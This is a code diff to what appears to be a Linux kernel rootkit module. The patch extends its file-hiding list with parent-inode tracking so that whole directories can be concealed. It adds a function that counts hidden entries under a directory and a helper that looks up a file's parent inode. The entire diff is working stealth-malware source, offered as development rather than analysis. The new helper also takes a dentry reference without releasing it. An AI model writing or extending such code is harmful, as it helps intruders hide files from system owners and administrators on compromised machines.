@@ -156,6 +156,7 @@ struct fs_file_node* fs_get_file_node(const struct task_struct *task) {
 static LIST_HEAD(names_node);
 struct hidden_names {
     u64 ino;
+    u64 ino_parent;
     char *name;
     struct list_head list;
     bool ro;
@@ -177,43 +178,28 @@ bool fs_search_name(const char *name, u64 ino) {
     return false;
 }
 
-/**
- * find the name match, and update
- * inode, type, if necessary
- * this can be useful for "hide-file-anywhere" when the next
- * call is statx, making data available upwards
- */
-bool fs_search_and_update(const char *name, u64 ino, bool is_dir) {
-    bool rc = false;
+int fs_is_dir_inode_hidden(const char *name, u64 ino) {
     struct hidden_names *node, *node_safe;
+    int count = 0;
     list_for_each_entry_safe(node, node_safe, &names_node, list) {
-
-        /** This will match any string starting with pattern */
-        if (!strncmp(node->name, name, strlen(node->name))) {
-            rc = true;
-
-            if (node->is_dir != is_dir) {
-                prinfo("Update[is_dir] name='%s' ino=%llu is_dir=%d\n", name, ino, is_dir);
-                node->is_dir = is_dir;
-            }
-            if (node->ino != ino) {
-                prinfo("Update[ino] name='%s' ino=%llu is_dir=%d\n", name, ino, is_dir);
-                node->ino = ino;
-            }
-            break;
-        }
+        if (node->is_dir && ino == node->ino_parent)
+            count++;
     }
-    return rc;
+    return count;
 }
 
 void fs_list_names(void) {
     struct hidden_names *node, *node_safe;
     list_for_each_entry_safe(node, node_safe, &names_node, list) {
-        prinfo("hidden: '%s' ino=%llu directory='%s'\n", node->name, node->ino, node->is_dir ? "Yes" : "No");
+        if (node->is_dir) {
+            prinfo("hidden: '%s' [directory] ino=%llu ino_parent=%llu\n", node->name, node->ino, node->ino_parent);
+        } else {
+            prinfo("hidden: '%s' ino=%llu\n", node->name, node->ino);
+        }
     }
 }
 
-static int _fs_add_name(const char *name, bool ro, u64 ino, bool is_dir) {
+static int _fs_add_name(const char *name, bool ro, u64 ino, u64 ino_parent, bool is_dir) {
     size_t len;
 
     if (!name)
@@ -234,6 +220,7 @@ static int _fs_add_name(const char *name, bool ro, u64 ino, bool is_dir) {
         hn->ro = ro;
         hn->ino = ino;
         hn->is_dir = is_dir;
+        hn->ino_parent = ino_parent;
         /** the gap caused by banned words
          * is the most fun
          */
@@ -247,15 +234,15 @@ err:
 }
 
 int fs_add_name_ro(const char *name, u64 ino) {
-    return _fs_add_name(name, true, ino, false);
+    return _fs_add_name(name, true, ino, 0, false);
 }
 
 int fs_add_name_rw(const char *name, u64 ino) {
-    return _fs_add_name(name, false, ino, false);
+    return _fs_add_name(name, false, ino, 0, false);
 }
 
-int fs_add_name_rw_dir(const char *name, u64 ino, bool is_dir) {
-    return _fs_add_name(name, false, ino, is_dir);
+int fs_add_name_rw_dir(const char *name, u64 ino, u64 ino_parent, bool is_dir) {
+    return _fs_add_name(name, false, ino, ino_parent, is_dir);
 }
 
 bool fs_del_name(const char *name) {
@@ -290,6 +277,26 @@ void fs_names_cleanup(void) {
         kfree(node);
         node = NULL;
     }
+}
+
+static struct inode *_fs_get_parent_inode(struct path *file_path) {
+    struct dentry *parent_dentry;
+    if (!file_path) {
+        prerr("%s: invalid argument: %p\n", __FUNCTION__, file_path);
+        return NULL;
+    }
+
+    parent_dentry = dget_parent(file_path->dentry);
+    if (parent_dentry)
+        return parent_dentry->d_inode;
+    return NULL;
+}
+
+u64 fs_get_parent_inode(struct path *file_path) {
+    struct inode *inode = _fs_get_parent_inode(file_path);
+    if (inode)
+        return inode->i_ino;
+    return 0;
 }
 
 struct file *fs_kernel_open_file(const char *name) {
